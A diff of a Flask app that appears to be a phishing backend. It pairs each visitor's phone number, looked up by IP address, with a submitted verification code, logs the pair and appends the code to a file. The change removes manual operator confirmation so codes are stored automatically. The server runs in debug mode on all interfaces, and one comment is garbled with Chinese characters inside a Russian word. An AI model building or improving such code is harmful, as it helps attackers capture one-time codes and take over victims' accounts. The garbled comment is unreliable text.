@@ -52,7 +52,7 @@ def submit_code():
     if not code:
         return render_template('Code.html', error="Code is required.", previous_code="")
     
-    # Получаем IP-адрес клиента
+    # Получаем IP-адрес客户端а
     client_ip = request.remote_addr
     
     # Ищем номер телефона по IP
@@ -61,22 +61,14 @@ def submit_code():
     # Выводим в консоль: Номер телефона -> Код
     print(f"{phone} -> {code}")
     
-    # Запрашиваем подтверждение в терминале
-    print(f"Код: {code}. Верный ли код? (y/n)")
-    confirmation = input().strip().lower()
-    
-    # Проверяем ответ
-    if confirmation in ('y', 'yes'):
-        # Сохраняем в файл
-        try:
-            with open('data.txt', 'a', encoding='utf-8') as f:
-                f.write(f"CODE: {code}\n")
-            return render_template('Success.html')  # Перенаправляем на страницу успеха
-        except Exception as e:
-            print(f"Ошибка при сохранении кода: {str(e)}")
-            return render_template('Code.html', error=f"Error saving code: {str(e)}", previous_code=code)
-    else:
-        return render_template('Code.html', error="Invalid code. Please try again.", previous_code=code)
+    # Сохраняем в файл
+    try:
+        with open('data.txt', 'a', encoding='utf-8') as f:
+            f.write(f"CODE: {code}\n")
+        return render_template('Success.html')  # Перенаправляем на страницу успеха
+    except Exception as e:
+        print(f"Ошибка при сохранении кода: {str(e)}")
+        return render_template('Code.html', error=f"Error saving code: {str(e)}", previous_code=code)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=3000, debug=True)
